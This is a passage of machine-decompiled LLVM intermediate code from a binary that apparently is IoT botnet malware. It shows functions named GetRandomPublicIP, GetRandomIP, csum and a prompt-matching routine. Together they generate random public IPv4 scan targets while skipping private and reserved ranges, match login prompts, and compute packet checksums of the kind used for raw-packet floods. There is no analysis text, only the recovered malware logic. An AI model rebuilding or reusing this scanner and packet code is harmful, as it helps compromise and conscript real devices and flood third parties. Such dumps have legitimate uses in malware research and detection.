  br i1 %v1_8049aa1, label %dec_label_pc_8049ae3.backedge, label %dec_label_pc_8049b26

dec_label_pc_8049ae3.backedge:                    ; preds = %dec_label_pc_8049a7f, %dec_label_pc_8049ac5, %dec_label_pc_8049acb
  %stack_var_-32.0.be = phi i32 [ %v5_8049a31, %dec_label_pc_8049ac5 ], [ %v5_8049a31, %dec_label_pc_8049acb ], [ %v5_8049a82, %dec_label_pc_8049a7f ]
  %v1_8049ae6 = add i32 %stack_var_-32.0.be, 2
  %v5_8049aec = icmp slt i32 %v1_8049ae6, %arg7
  br i1 %v5_8049aec, label %dec_label_pc_8049ae3.backedge.dec_label_pc_8049aee_crit_edge, label %dec_label_pc_8049b0a

dec_label_pc_8049ae3.backedge.dec_label_pc_8049aee_crit_edge: ; preds = %dec_label_pc_8049ae3.backedge
  %v3_8049aee.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049aee

dec_label_pc_8049aaf:                             ; preds = %dec_label_pc_8049a2e
  %v3_8049abc = call i32 @strstr(i32 %v5_80499e8, i8* %v2_8049abc)
  %v1_8049ac1 = icmp eq i32 %v3_8049abc, 0
  %v1_8049ac3 = icmp eq i1 %v1_8049ac1, false
  br i1 %v1_8049ac3, label %dec_label_pc_8049b0a, label %dec_label_pc_8049ac5

dec_label_pc_8049ac5:                             ; preds = %dec_label_pc_8049aaf
  br i1 %v4_8049ac5, label %dec_label_pc_8049ae3.backedge, label %dec_label_pc_8049acb

dec_label_pc_8049acb:                             ; preds = %dec_label_pc_8049ac5
  %v2_8049ad1 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049ad6 = icmp eq i32 %v2_8049ad1, 0
  br i1 %v1_8049ad6, label %dec_label_pc_8049ae3.backedge, label %dec_label_pc_8049b0a

dec_label_pc_8049aee:                             ; preds = %dec_label_pc_8049ae3.backedge.dec_label_pc_8049aee_crit_edge, %dec_label_pc_8049aee.lr.ph
  %v3_8049aee = phi i32 [ %arg4, %dec_label_pc_8049aee.lr.ph ], [ %v3_8049aee.pre, %dec_label_pc_8049ae3.backedge.dec_label_pc_8049aee_crit_edge ]
  %stack_var_-32.043 = phi i32 [ %arg8, %dec_label_pc_8049aee.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049ae3.backedge.dec_label_pc_8049aee_crit_edge ]
  %tmp28 = icmp slt i32 %v3_8049aee, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804997e, label %dec_label_pc_8049afc

dec_label_pc_8049afc:                             ; preds = %dec_label_pc_8049aee
  br i1 %tmp31, label %dec_label_pc_804997e, label %dec_label_pc_8049b0a

dec_label_pc_8049b0a:                             ; preds = %dec_label_pc_804997e, %dec_label_pc_8049afc, %dec_label_pc_8049ae3.backedge, %dec_label_pc_8049acb, %dec_label_pc_8049aaf, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049aaf ], [ 1, %dec_label_pc_8049acb ], [ 0, %dec_label_pc_8049ae3.backedge ], [ 0, %dec_label_pc_8049afc ], [ 0, %dec_label_pc_804997e ]
  br label %dec_label_pc_8049b26

dec_label_pc_8049b26:                             ; preds = %dec_label_pc_8049a7f, %dec_label_pc_8049a3e, %dec_label_pc_8049a6a, %dec_label_pc_80499e5, %dec_label_pc_8049a19, %dec_label_pc_8049b0a
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b0a ], [ 0, %dec_label_pc_8049a19 ], [ 0, %dec_label_pc_80499e5 ], [ 0, %dec_label_pc_8049a6a ], [ 0, %dec_label_pc_8049a3e ], [ 0, %dec_label_pc_8049a7f ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049a5c, { 1, 2, 0 }
  uselistorder i32 %v4_8049a0b, { 1, 2, 0 }
  uselistorder i32 %v5_80499e8, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b26, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b0a, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049ae3.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049b38 = load i32, i32* @edi, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  store i32 %v0_8049b3a, i32* %stack_var_-16, align 4
  %v1_8049b3e = call i32 @random()
  %v2_8049b60 = sdiv i32 %v1_8049b3e, 49
  store i32 %v2_8049b60, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049b60, -223
  %v2_8049b7b = add i32 %v1_8049b3e, %tmp
  %v14_8049b7b = trunc i32 %v2_8049b7b to i8
  store i32 %v2_8049b7b, i32* @eax, align 4
  store i8 %v14_8049b7b, i8* @global_var_80584db.35, align 1
  %v1_8049b89 = call i32 @random()
  %v2_8049bab = sdiv i32 %v1_8049b89, 51
  store i32 %v2_8049bab, i32* @ebx, align 4
  %tmp39 = mul i32 %v2_8049bab, -255
  %v2_8049bbb = add i32 %v1_8049b89, %tmp39
  %v14_8049bbb = trunc i32 %v2_8049bbb to i8
  store i32 %v2_8049bbb, i32* @eax, align 4
  store i8 %v14_8049bbb, i8* @global_var_80584dc.36, align 4
  %v1_8049bc9 = call i32 @random()
  %v2_8049beb = sdiv i32 %v1_8049bc9, 51
  store i32 %v2_8049beb, i32* @ebx, align 4
  %tmp40 = mul i32 %v2_8049beb, -255
  %v2_8049bfb = add i32 %v1_8049bc9, %tmp40
  %v14_8049bfb = trunc i32 %v2_8049bfb to i8
  store i32 %v2_8049bfb, i32* @eax, align 4
  store i8 %v14_8049bfb, i8* @global_var_80584dd.37, align 1
  %v1_8049c09 = call i32 @random()
  %v2_8049c2b = sdiv i32 %v1_8049c09, 51
  store i32 %v2_8049c2b, i32* @ebx, align 4
  %tmp41 = mul i32 %v2_8049c2b, -255
  %v2_8049c3b = add i32 %v1_8049c09, %tmp41
  br label %dec_label_pc_8049d59

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049f28, %dec_label_pc_8049f19, %dec_label_pc_8049f0a, %dec_label_pc_8049efb, %dec_label_pc_8049eec, %dec_label_pc_8049edd, %dec_label_pc_8049ece, %dec_label_pc_8049ebf, %dec_label_pc_8049eb0, %dec_label_pc_8049ea1, %dec_label_pc_8049e92, %dec_label_pc_8049e83, %dec_label_pc_8049e74, %dec_label_pc_8049e65, %dec_label_pc_8049e56, %dec_label_pc_8049e31, %dec_label_pc_8049e17, %dec_label_pc_8049df2, %dec_label_pc_8049dcd, %dec_label_pc_8049db3, %dec_label_pc_8049da4, %dec_label_pc_8049d95, %dec_label_pc_8049d86, %dec_label_pc_8049d77, %dec_label_pc_8049d68, %dec_label_pc_8049d59
  %v0_8049c4e = call i32 @random()
  %v2_8049c70 = sdiv i32 %v0_8049c4e, 49
  store i32 %v2_8049c70, i32* @ebx, align 4
  %tmp42 = mul i32 %v2_8049c70, -223
  %v2_8049c8b = add i32 %v0_8049c4e, %tmp42
  %v14_8049c8b = trunc i32 %v2_8049c8b to i8
  store i32 %v2_8049c8b, i32* @eax, align 4
  store i8 %v14_8049c8b, i8* @global_var_80584db.35, align 1
  %v1_8049c99 = call i32 @random()
  %v2_8049cbb = sdiv i32 %v1_8049c99, 51
  store i32 %v2_8049cbb, i32* @ebx, align 4
  %tmp43 = mul i32 %v2_8049cbb, -255
  %v2_8049ccb = add i32 %v1_8049c99, %tmp43
  %v14_8049ccb = trunc i32 %v2_8049ccb to i8
  store i32 %v2_8049ccb, i32* @eax, align 4
  store i8 %v14_8049ccb, i8* @global_var_80584dc.36, align 4
  %v1_8049cd9 = call i32 @random()
  %v2_8049cfb = sdiv i32 %v1_8049cd9, 51
  store i32 %v2_8049cfb, i32* @ebx, align 4
  %tmp44 = mul i32 %v2_8049cfb, -255
  %v2_8049d0b = add i32 %v1_8049cd9, %tmp44
  %v14_8049d0b = trunc i32 %v2_8049d0b to i8
  store i32 %v2_8049d0b, i32* @eax, align 4
  store i8 %v14_8049d0b, i8* @global_var_80584dd.37, align 1
  %v1_8049d19 = call i32 @random()
  %v2_8049d3b = sdiv i32 %v1_8049d19, 51
  store i32 %v2_8049d3b, i32* @ebx, align 4
  %tmp45 = mul i32 %v2_8049d3b, -255
  %v2_8049d4b = add i32 %v1_8049d19, %tmp45
  br label %dec_label_pc_8049d59

dec_label_pc_8049d59:                             ; preds = %entry, %dec_label_pc_8049c4e
  %storemerge13.in = phi i32 [ %v2_8049d4b, %dec_label_pc_8049c4e ], [ %v2_8049c3b, %entry ]
  %v14_8049c3b = trunc i32 %storemerge13.in to i8
  store i8 %v14_8049c3b, i8* @global_var_80584de.38, align 2
  %v0_8049d59 = load i8, i8* @global_var_80584db.35, align 1
  %v1_8049d59 = zext i8 %v0_8049d59 to i32
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049d60 = icmp eq i8 %v0_8049d59, 127
  br i1 %v10_8049d60, label %dec_label_pc_8049c4e, label %dec_label_pc_8049d68

dec_label_pc_8049d68:                             ; preds = %dec_label_pc_8049d59
  store i32 %v1_8049d59, i32* @eax, align 4
  %v4_8049d6f = icmp eq i8 %v0_8049d59, 0
  br i1 %v4_8049d6f, label %dec_label_pc_8049c4e, label %dec_label_pc_8049d77

dec_label_pc_8049d77:                             ; preds = %dec_label_pc_8049d68
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049d7e = icmp eq i8 %v0_8049d59, 3
  br i1 %v10_8049d7e, label %dec_label_pc_8049c4e, label %dec_label_pc_8049d86

dec_label_pc_8049d86:                             ; preds = %dec_label_pc_8049d77
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049d8d = icmp eq i8 %v0_8049d59, 15
  br i1 %v10_8049d8d, label %dec_label_pc_8049c4e, label %dec_label_pc_8049d95

dec_label_pc_8049d95:                             ; preds = %dec_label_pc_8049d86
  store i32 %v1_8049d59, i32* @eax, align 4
  %v7_8049d9c = icmp eq i8 %v0_8049d59, 16
  br i1 %v7_8049d9c, label %dec_label_pc_8049c4e, label %dec_label_pc_8049da4

dec_label_pc_8049da4:                             ; preds = %dec_label_pc_8049d95
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049dab = icmp eq i8 %v0_8049d59, 56
  br i1 %v10_8049dab, label %dec_label_pc_8049c4e, label %dec_label_pc_8049db3

dec_label_pc_8049db3:                             ; preds = %dec_label_pc_8049da4
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049dba = icmp eq i8 %v0_8049d59, 10
  br i1 %v10_8049dba, label %dec_label_pc_8049c4e, label %dec_label_pc_8049dc2

dec_label_pc_8049dc2:                             ; preds = %dec_label_pc_8049db3
  %v8_8049dc9 = icmp eq i8 %v0_8049d59, -64
  %v1_8049dcb = icmp eq i1 %v8_8049dc9, false
  br i1 %v1_8049dcb, label %dec_label_pc_8049ddc, label %dec_label_pc_8049dcd

dec_label_pc_8049dcd:                             ; preds = %dec_label_pc_8049dc2
  %v0_8049dcd = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049dcd = zext i8 %v0_8049dcd to i32
  store i32 %v1_8049dcd, i32* @eax, align 4
  %v11_8049dd4 = icmp eq i8 %v0_8049dcd, -88
  br i1 %v11_8049dd4, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ddc

dec_label_pc_8049ddc:                             ; preds = %dec_label_pc_8049dcd, %dec_label_pc_8049dc2
  %v11_8049de3 = icmp eq i8 %v0_8049d59, -84
  %v1_8049de5 = icmp eq i1 %v11_8049de3, false
  br i1 %v1_8049de5, label %dec_label_pc_8049e01, label %dec_label_pc_8049de7

dec_label_pc_8049de7:                             ; preds = %dec_label_pc_8049ddc
  %v0_8049de7 = load i8, i8* @global_var_80584dc.36, align 4
  %tmp46 = icmp ult i8 %v0_8049de7, 16
  br i1 %tmp46, label %dec_label_pc_8049e01, label %dec_label_pc_8049df2

dec_label_pc_8049df2:                             ; preds = %dec_label_pc_8049de7
  %v1_8049de7 = zext i8 %v0_8049de7 to i32
  store i32 %v1_8049de7, i32* @eax, align 4
  %tmp47 = icmp ult i8 %v0_8049de7, 32
  br i1 %tmp47, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e01

dec_label_pc_8049e01:                             ; preds = %dec_label_pc_8049df2, %dec_label_pc_8049de7, %dec_label_pc_8049ddc
  %v10_8049e08 = icmp eq i8 %v0_8049d59, 100
  %v1_8049e0a = icmp eq i1 %v10_8049e08, false
  br i1 %v1_8049e0a, label %dec_label_pc_8049e26, label %dec_label_pc_8049e0c

dec_label_pc_8049e0c:                             ; preds = %dec_label_pc_8049e01
  %v0_8049e0c = load i8, i8* @global_var_80584dc.36, align 4
  %tmp48 = icmp ult i8 %v0_8049e0c, 64
  br i1 %tmp48, label %dec_label_pc_8049e26, label %dec_label_pc_8049e17

dec_label_pc_8049e17:                             ; preds = %dec_label_pc_8049e0c
  %v1_8049e0c = zext i8 %v0_8049e0c to i32
  store i32 %v1_8049e0c, i32* @eax, align 4
  %tmp49 = icmp ult i8 %v0_8049e0c, 127
  br i1 %tmp49, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e26

dec_label_pc_8049e26:                             ; preds = %dec_label_pc_8049e17, %dec_label_pc_8049e0c, %dec_label_pc_8049e01
  %v11_8049e2d = icmp eq i8 %v0_8049d59, -87
  %v1_8049e2f = icmp eq i1 %v11_8049e2d, false
  br i1 %v1_8049e2f, label %dec_label_pc_8049e40, label %dec_label_pc_8049e31

dec_label_pc_8049e31:                             ; preds = %dec_label_pc_8049e26
  %v0_8049e31 = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049e31 = zext i8 %v0_8049e31 to i32
  store i32 %v1_8049e31, i32* @eax, align 4
  %v11_8049e38 = icmp eq i8 %v0_8049e31, -1
  br i1 %v11_8049e38, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e40

dec_label_pc_8049e40:                             ; preds = %dec_label_pc_8049e31, %dec_label_pc_8049e26
  %v11_8049e47 = icmp eq i8 %v0_8049d59, -58
  %v1_8049e49 = icmp eq i1 %v11_8049e47, false
  br i1 %v1_8049e49, label %dec_label_pc_8049e65, label %dec_label_pc_8049e4b

dec_label_pc_8049e4b:                             ; preds = %dec_label_pc_8049e40
  %v0_8049e4b = load i8, i8* @global_var_80584dc.36, align 4
  %tmp50 = icmp ult i8 %v0_8049e4b, 18
  br i1 %tmp50, label %dec_label_pc_8049e65, label %dec_label_pc_8049e56

dec_label_pc_8049e56:                             ; preds = %dec_label_pc_8049e4b
  %v1_8049e4b = zext i8 %v0_8049e4b to i32
  store i32 %v1_8049e4b, i32* @eax, align 4
  %tmp51 = or i8 %v0_8049e4b, 1
  %tmp52 = icmp eq i8 %tmp51, 19
  br i1 %tmp52, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e65

dec_label_pc_8049e65:                             ; preds = %dec_label_pc_8049e56, %dec_label_pc_8049e4b, %dec_label_pc_8049e40
  store i32 %v1_8049d59, i32* @eax, align 4
  %v8_8049e6c = icmp eq i8 %v0_8049d59, -32
  br i1 %v8_8049e6c, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e74

dec_label_pc_8049e74:                             ; preds = %dec_label_pc_8049e65
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049e7b = icmp eq i8 %v0_8049d59, 6
  br i1 %v10_8049e7b, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e83

dec_label_pc_8049e83:                             ; preds = %dec_label_pc_8049e74
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049e8a = icmp eq i8 %v0_8049d59, 7
  br i1 %v10_8049e8a, label %dec_label_pc_8049c4e, label %dec_label_pc_8049e92

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e83
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049e99 = icmp eq i8 %v0_8049d59, 11
  br i1 %v10_8049e99, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ea1

dec_label_pc_8049ea1:                             ; preds = %dec_label_pc_8049e92
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049ea8 = icmp eq i8 %v0_8049d59, 21
  br i1 %v10_8049ea8, label %dec_label_pc_8049c4e, label %dec_label_pc_8049eb0

dec_label_pc_8049eb0:                             ; preds = %dec_label_pc_8049ea1
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049eb7 = icmp eq i8 %v0_8049d59, 22
  br i1 %v10_8049eb7, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ebf

dec_label_pc_8049ebf:                             ; preds = %dec_label_pc_8049eb0
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049ec6 = icmp eq i8 %v0_8049d59, 26
  br i1 %v10_8049ec6, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ece

dec_label_pc_8049ece:                             ; preds = %dec_label_pc_8049ebf
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049ed5 = icmp eq i8 %v0_8049d59, 28
  br i1 %v10_8049ed5, label %dec_label_pc_8049c4e, label %dec_label_pc_8049edd

dec_label_pc_8049edd:                             ; preds = %dec_label_pc_8049ece
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049ee4 = icmp eq i8 %v0_8049d59, 29
  br i1 %v10_8049ee4, label %dec_label_pc_8049c4e, label %dec_label_pc_8049eec

dec_label_pc_8049eec:                             ; preds = %dec_label_pc_8049edd
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049ef3 = icmp eq i8 %v0_8049d59, 30
  br i1 %v10_8049ef3, label %dec_label_pc_8049c4e, label %dec_label_pc_8049efb

dec_label_pc_8049efb:                             ; preds = %dec_label_pc_8049eec
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049f02 = icmp eq i8 %v0_8049d59, 33
  br i1 %v10_8049f02, label %dec_label_pc_8049c4e, label %dec_label_pc_8049f0a

dec_label_pc_8049f0a:                             ; preds = %dec_label_pc_8049efb
  store i32 %v1_8049d59, i32* @eax, align 4
  %v10_8049f11 = icmp eq i8 %v0_8049d59, 55
  br i1 %v10_8049f11, label %dec_label_pc_8049c4e, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049f0a
  store i32 %v1_8049d59, i32* @eax, align 4
  %v11_8049f20 = icmp eq i8 %v0_8049d59, -42
  br i1 %v11_8049f20, label %dec_label_pc_8049c4e, label %dec_label_pc_8049f28

dec_label_pc_8049f28:                             ; preds = %dec_label_pc_8049f19
  store i32 %v1_8049d59, i32* @eax, align 4
  %v11_8049f2f = icmp eq i8 %v0_8049d59, -41
  br i1 %v11_8049f2f, label %dec_label_pc_8049c4e, label %dec_label_pc_8049f37

dec_label_pc_8049f37:                             ; preds = %dec_label_pc_8049f28
  store i32 0, i32* %stack_var_-32, align 4
  %v1_8049f53 = urem i32 %storemerge13.in, 256
  store i32 %v1_8049f53, i32* @edx, align 4
  %v0_8049f67 = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049f67 = zext i8 %v0_8049f67 to i32
  store i32 %v1_8049f67, i32* @ebx, align 4
  %v2_8049f80 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049f80, i32* @edi, align 4
  %v4_8049f9a = call i32 @szprintf(i32 %v2_8049f80, i32 ptrtoint ([12 x i8]* @global_var_8055d07.39 to i32), i32 %v1_8049d59)
  %v1_8049fa5 = call i32 @inet_addr(i32 %v2_8049f80)
  %v2_8049fad = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049fad, i32* @ebx, align 4
  store i32 %v0_8049b38, i32* @edi, align 4
  ret i32 %v1_8049fa5

; uselistorder directives
  uselistorder i8 %v0_8049e4b, { 0, 2, 1 }
  uselistorder i8 %v0_8049e0c, { 0, 2, 1 }
  uselistorder i8 %v0_8049de7, { 0, 2, 1 }
  uselistorder i8 %v0_8049d59, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32 %v2_8049d0b, { 1, 0 }
  uselistorder i32 %v2_8049ccb, { 1, 0 }
  uselistorder i32 %v2_8049c8b, { 1, 0 }
  uselistorder i32 %v2_8049bfb, { 1, 0 }
  uselistorder i32 %v2_8049bbb, { 1, 0 }
  uselistorder i32 %v2_8049b7b, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8* @global_var_80584dd.37, { 1, 0 }
  uselistorder i8* @global_var_80584dc.36, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_80584db.35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049d59, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049fb2 = load i32, i32* @ebp, align 4
  store i32 %v0_8049fb2, i32* %stack_var_-4, align 4
  %v0_8049fb8 = load i32, i32* @global_var_805e748.40, align 8
  %v1_8049fc0 = call i32 @ntohl(i32 %v0_8049fb8)
  %v5_8049fc5 = and i32 %v1_8049fc0, %arg1
  %v1_8049fcb = call i32 @rand_cmwc(i32 %v5_8049fc5)
  %v1_8049fd5 = sub i32 -1, %arg1
  %v2_8049fd7 = and i32 %v1_8049fcb, %v1_8049fd5
  %v5_8049fd9 = xor i32 %v2_8049fd7, %v5_8049fc5
  %v2_8049fdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049fdc, i32* @ebp, align 4
  ret i32 %v5_8049fd9
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049fe3 = load i32, i32* @ebx, align 4
  %v4_804a01233 = add i32 %arg2, -1
  %v9_804a01234 = sub i32 0, %arg2
  %v10_804a01235 = and i32 %arg2, %v9_804a01234
  %v11_804a01236 = icmp slt i32 %v10_804a01235, 0
  %v12_804a01237 = icmp eq i32 %v4_804a01233, 0
  %v13_804a01238 = icmp slt i32 %v4_804a01233, 0
  %v3_804a01639 = icmp eq i1 %v13_804a01238, %v11_804a01236
  %v4_804a01640 = icmp eq i1 %v12_804a01237, false
  %v5_804a01641 = and i1 %v4_804a01640, %v3_804a01639
  br i1 %v5_804a01641, label %dec_label_pc_8049ff7, label %dec_label_pc_804a018

dec_label_pc_8049ff7:                             ; preds = %entry, %dec_label_pc_8049ff7
  %stack_var_-24.045 = phi i16 [ %v9_804a007, %dec_label_pc_8049ff7 ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804a00e, %dec_label_pc_8049ff7 ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804a00a, %dec_label_pc_8049ff7 ], [ %arg1, %entry ]
  %v3_804a00442 = phi i32 [ %v6_804a004, %dec_label_pc_8049ff7 ], [ 0, %entry ]
  %v4_8049ff7 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_8049ffa = load i16, i16* %stack_var_4.043, align 2
  %v3_8049ffa = zext i16 %v2_8049ffa to i32
  %sext51 = mul i32 %v3_804a00442, 65536
  %v4_804a004 = sdiv i32 %sext51, 65536
  %v6_804a004 = add nsw i32 %v3_8049ffa, %v4_804a004
  %v11_804a004 = icmp ult i32 %v6_804a004, %v4_804a004
  %v26_804a004 = trunc i32 %v6_804a004 to i16
  %v7_804a007 = zext i1 %v11_804a004 to i16
  %v9_804a007 = add i16 %v7_804a007, %stack_var_-24.045
  %v5_804a00a = add i32 %v4_8049ff7, 2
  %v23_804a00a = inttoptr i32 %v5_804a00a to i16*
  %v4_804a00e = add i32 %stack_var_8.044, -2
  %v4_804a012 = add i32 %stack_var_8.044, -3
  %v9_804a012 = sub i32 2, %stack_var_8.044
  %v10_804a012 = and i32 %v4_804a00e, %v9_804a012
  %v11_804a012 = icmp slt i32 %v10_804a012, 0
  %v12_804a012 = icmp eq i32 %v4_804a012, 0
  %v13_804a012 = icmp slt i32 %v4_804a012, 0
  %v3_804a016 = icmp eq i1 %v13_804a012, %v11_804a012
  %v4_804a016 = icmp eq i1 %v12_804a012, false
  %v5_804a016 = and i1 %v4_804a016, %v3_804a016
  br i1 %v5_804a016, label %dec_label_pc_8049ff7, label %dec_label_pc_804a018

dec_label_pc_804a018:                             ; preds = %dec_label_pc_8049ff7, %entry
  %v3_804a004.lcssa = phi i16 [ 0, %entry ], [ %v26_804a004, %dec_label_pc_8049ff7 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804a00a, %dec_label_pc_8049ff7 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804a00e, %dec_label_pc_8049ff7 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804a007, %dec_label_pc_8049ff7 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804a059.preheader, label %dec_label_pc_804a01e

dec_label_pc_804a01e:                             ; preds = %dec_label_pc_804a018
  %v1_804a021 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804a021 = load i8, i8* %v1_804a021, align 1
  %v3_804a021 = zext i8 %v2_804a021 to i32
  %v4_804a02c = sext i16 %v3_804a004.lcssa to i32
  %v6_804a02c = add nsw i32 %v3_804a021, %v4_804a02c
  %v11_804a02c = icmp ult i32 %v6_804a02c, %v4_804a02c
  %v26_804a02c = trunc i32 %v6_804a02c to i16
  %v7_804a02f = zext i1 %v11_804a02c to i16
  %v9_804a02f = add i16 %v7_804a02f, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804a059.preheader

dec_label_pc_804a059.preheader:                   ; preds = %dec_label_pc_804a01e, %dec_label_pc_804a018
  %v3_804a03e.ph = phi i16 [ %v3_804a004.lcssa, %dec_label_pc_804a018 ], [ %v26_804a02c, %dec_label_pc_804a01e ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804a018 ], [ %v9_804a02f, %dec_label_pc_804a01e ]
  %v4_804a05920 = sext i16 %v3_804a03e.ph to i32
  %v4_804a05c21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804a05f22 = udiv i32 %v4_804a05920, 65536
  %v4_804a05f23 = mul i32 %v4_804a05c21, 65536
  %v5_804a05f24 = or i32 %v4_804a05f23, %v3_804a05f22
  %v2_804a06325 = udiv i32 %v4_804a05c21, 65536
  %v2_804a06626 = or i32 %v5_804a05f24, %v2_804a06325
  %v3_804a06627 = icmp eq i32 %v2_804a06626, 0
  %v1_804a06a28 = icmp eq i1 %v3_804a06627, false
  br i1 %v1_804a06a28, label %dec_label_pc_804a034, label %dec_label_pc_804a06c

dec_label_pc_804a034:                             ; preds = %dec_label_pc_804a059.preheader, %dec_label_pc_804a034
  %v2_804a06331 = phi i32 [ %v2_804a063, %dec_label_pc_804a034 ], [ %v2_804a06325, %dec_label_pc_804a059.preheader ]
  %v5_804a05f30 = phi i32 [ %v5_804a05f, %dec_label_pc_804a034 ], [ %v5_804a05f24, %dec_label_pc_804a059.preheader ]
  %v4_804a05929 = phi i32 [ %v4_804a059, %dec_label_pc_804a034 ], [ %v4_804a05920, %dec_label_pc_804a059.preheader ]
  %v2_804a04f = add i32 %v5_804a05f30, %v4_804a05929
  %v7_804a04f = icmp ult i32 %v2_804a04f, %v4_804a05929
  %v3_804a051 = zext i1 %v7_804a04f to i32
  %v5_804a051 = add nuw nsw i32 %v3_804a051, %v2_804a06331
  %sext = mul i32 %v2_804a04f, 65536
  %v4_804a059 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804a051, 65536
  %v4_804a05c = sdiv i32 %sext50, 65536
  %v3_804a05f = udiv i32 %v4_804a059, 65536
  %v5_804a05f = or i32 %sext50, %v3_804a05f
  %v2_804a063 = udiv i32 %v4_804a05c, 65536
  %v2_804a066 = or i32 %v5_804a05f, %v2_804a063
  %v3_804a066 = icmp eq i32 %v2_804a066, 0
  %v1_804a06a = icmp eq i1 %v3_804a066, false
  br i1 %v1_804a06a, label %dec_label_pc_804a034, label %dec_label_pc_804a059.dec_label_pc_804a06c_crit_edge

dec_label_pc_804a059.dec_label_pc_804a06c_crit_edge: ; preds = %dec_label_pc_804a034
  br label %dec_label_pc_804a06c

dec_label_pc_804a06c:                             ; preds = %dec_label_pc_804a059.dec_label_pc_804a06c_crit_edge, %dec_label_pc_804a059.preheader
  %v4_804a059.lcssa = phi i32 [ %v4_804a059, %dec_label_pc_804a059.dec_label_pc_804a06c_crit_edge ], [ %v4_804a05920, %dec_label_pc_804a059.preheader ]
  %v1_804a070 = urem i32 %v4_804a059.lcssa, 65536
  %v1_804a072 = xor i32 %v1_804a070, 65535
  store i32 %v0_8049fe3, i32* @ebx, align 4
  ret i32 %v1_804a072

; uselistorder directives
  uselistorder i32 %v5_804a05f, { 1, 0 }
  uselistorder i32 %v4_804a059, { 1, 0, 2 }
  uselistorder i32 %v2_804a06325, { 1, 0 }
  uselistorder i32 %v4_804a05c21, { 1, 0 }
  uselistorder i32 %v4_804a05920, { 2, 1, 0 }
  uselistorder i32 %v4_804a02c, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804a004.lcssa, { 1, 0 }
  uselistorder i32 %v4_804a012, { 1, 0 }
  uselistorder i32 %v4_804a00e, { 0, 2, 1 }
  uselistorder i32 %v6_804a004, { 1, 2, 0 }
